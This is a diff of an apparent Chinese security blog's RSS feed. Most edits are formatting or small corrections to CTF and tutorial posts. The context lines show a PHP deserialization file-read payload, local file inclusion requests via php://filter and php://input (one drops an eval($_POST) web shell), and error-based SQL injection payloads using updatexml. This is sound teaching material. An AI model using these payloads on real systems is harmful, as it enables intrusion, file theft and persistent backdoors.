@@ -81,7 +81,7 @@
 &lt;p&gt;源码内我们标出了三个限制点： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;A, 对GET输入检查是否包含&amp;rsquo;users&amp;rsquo;字符串，我们可以通过修改序列化字符串中的s为S，这样就可以支持利用16进制编码来进行绕过， &lt;code&gt;s:4:&amp;quot;user&amp;quot;; -&amp;gt; S:4:&amp;quot;use\72&amp;quot;;&lt;/code&gt; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
-&lt;li&gt;B, 我们在序列化的字符串中对于 &lt;code&gt;MyFile-&amp;gt;name&lt;/code&gt; 会被 &lt;code&gt;__wakeup&lt;/code&gt; 给替换掉，我们可以利用修改属性来绕过 &lt;code&gt;__wakeup&lt;/code&gt; 的替换（此方法适用于PHP 7.0.10），这里我们使用浅copy来对可控变量 &lt;code&gt;$this-&amp;gt;user&lt;/code&gt; 来进行过滤 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;B, 我们在序列化的字符串中对于 &lt;code&gt;MyFile-&amp;gt;name&lt;/code&gt; 会被 &lt;code&gt;__wakeup&lt;/code&gt; 给替换掉，我们可以利用修改属性来绕过 &lt;code&gt;__wakeup&lt;/code&gt; 的替换（此方法只适用于PHP5 &amp;lt; 5.6.25, PHP7 &amp;lt; 7.0.10），这里我们使用浅copy来对可控变量 &lt;code&gt;$this-&amp;gt;user&lt;/code&gt; 来进行过滤 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;li&gt;C, 无法直接获取文件名，可以配合 &lt;code&gt;glob://&lt;/code&gt; 协议来测信道出 flag 的文件名字 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;因此我们构造 payload： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
@@ -105,7 +105,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 得到序列化结果:
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// O:6:&amp;#34;MyFile&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;use\\72&amp;#34;;R:2;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// O:6:&amp;#34;MyFile&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;use\72&amp;#34;;R:2;}
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 文件任意读 payload：
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// input=O:6:&amp;#34;MyFile&amp;#34;:2: {s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;us\65r&amp;#34;;R:2;}&amp;amp;user=/proc/self/mounts
@@ -245,8 +245,9 @@ O%3A4%3A%22Name%2 &lt;code&gt;3&lt;/code&gt; %3A2%3A%7Bs%3A14%3A%22%00Name%00use
         &lt;/figcaption&gt;
 &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;p&gt;参考：[[&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000022534926&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://segmentfault.com/a/1190000022534926&lt;/a&gt;][CTF-Web-[极客大挑战 2019]PHP &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;参考： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000022534926&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CTF-Web-[极客大挑战 2019]PHP&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -451,10 +452,10 @@ PREPARE stmt_name FROM preparable_stmt &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;li&gt;
 &lt;p&gt;其满足“最左前缀”原则，即使用where时条件要按照建立所以的字段的排列方式设置才能使索引生效 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-06-05_22-28-16_screenshot.png&#34;
-         alt=&#34;Figure 3: 联合索引：将几个列的值组合起来进行索引&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;联合索引：将几个列的值组合起来进行索引&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+                         alt=&#34;Figure 3: 联合索引：将几个列的值组合起来进行索引&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
+                            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;联合索引：将几个列的值组合起来进行索引&lt;/p&gt;
+                        &lt;/figcaption&gt;
+                &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -475,10 +476,10 @@ PREPARE stmt_name FROM preparable_stmt &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;Clustered Index 聚簇索引&lt;/p&gt;
 &lt;p&gt;其主要特点就是，数据的存储与索引是放在一起的，索引完成之后，数据也随之被找到。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-06-05_22-17-25_screenshot.png&#34;
-         alt=&#34;Figure 4: B&amp;#43;Tree&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;B+Tree&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+                 alt=&#34;Figure 4: B&amp;#43;Tree&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
+                    &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;B+Tree&lt;/p&gt;
+                &lt;/figcaption&gt;
+        &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -488,10 +489,10 @@ PREPARE stmt_name FROM preparable_stmt &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;非聚簇索引&lt;/p&gt;
 &lt;p&gt;数据和索引是分开的，其B+Tree叶子结点存放的是真正数据的地址而非数据的内容 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-06-05_22-33-07_screenshot.png&#34;
-         alt=&#34;Figure 5: 辅助索引：数据与索引分开&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 5: &lt;!-- raw HTML omitted --&gt;辅助索引：数据与索引分开&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+                 alt=&#34;Figure 5: 辅助索引：数据与索引分开&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
+                    &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 5: &lt;!-- raw HTML omitted --&gt;辅助索引：数据与索引分开&lt;/p&gt;
+                &lt;/figcaption&gt;
+        &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -808,10 +809,10 @@ PREPARE stmt_name FROM preparable_stmt &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我们通过 &lt;code&gt;php://filter&lt;/code&gt; 可以得到 &lt;code&gt;lrfiSession.php&lt;/code&gt; 中以base64加密的内容，然后再解密得到其明文内容 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/lrfiTest.php?filename=php://filter/read=convert.base64-encode/resource=lrfiSession.php
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-21_22-56-31_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-21_23-00-43_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;可用的过滤器列表： &lt;!-- raw HTML omitted --&gt;
 &lt;a class=&#34;link&#34; href=&#34;https://www.php.net/manual/zh/filters.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -833,7 +834,7 @@ PREPARE stmt_name FROM preparable_stmt &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/lrfiTest.php?filename=php://input
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fputs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lrfiInput.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php eval($_POST[a]) ?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-21_23-18-41_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -1618,7 +1619,7 @@ PREPARE stmt_name FROM preparable_stmt &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- -
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据上面对于Xpath_string的定义我们可以得知，当使用类似0x7e=&amp;rsquo;~&amp;lsquo;之类的额外字符的时候，会被认定为非Xpath，就会产生报错&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-23_20-38-37_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
 
 &lt;p&gt;查询当前数据库名称及操作系统版本信息：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and updatexml(1,concat(0x7e,database(),0x7e,@@version_compile_os,0x7e),3)-- -
@@ -1713,7 +1714,7 @@ count(*) = 主键出现的次数&lt;/p&gt;
 &lt;p&gt;(3) 为什么会发生主键重复？&lt;/p&gt;
 &lt;p&gt;我们接着看，接下来数据库会根据主键逐条查询users表中的内容。&lt;/p&gt;
 &lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-03-31_21-23-38_screenshot.png&#34; width=&#34;200px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
 
 &lt;p&gt;这里为了得到主键的具体内容，进行了第一次计算，得到security1(之前不是说了随机，这里我为什么说就是security1呢，因为实际测试结果就是，第一个生成的数字一定就是1，我认为可能和伪随机机制有关系)
 我们当然之后users表里不会有security1这样的字段，同样数据库也找不到，同时也没有发现重复的主键，因此会把主键的值直接插入临时表中，并将count(*)增加为1&lt;/p&gt;
